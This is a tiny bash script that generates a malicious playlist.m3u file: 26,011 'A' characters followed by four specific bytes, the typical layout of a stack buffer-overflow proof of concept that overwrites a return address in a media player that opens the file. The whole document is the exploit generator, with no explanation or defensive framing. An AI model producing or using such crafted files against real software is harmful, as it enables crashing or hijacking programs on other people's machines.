#!/bin/bash

FILE="./playlist.m3u"

cat > ${FILE} << EOF
$(python -c "print(('A' * 26011) + '\x32\xc5\x9c\x3d')") 
EOF
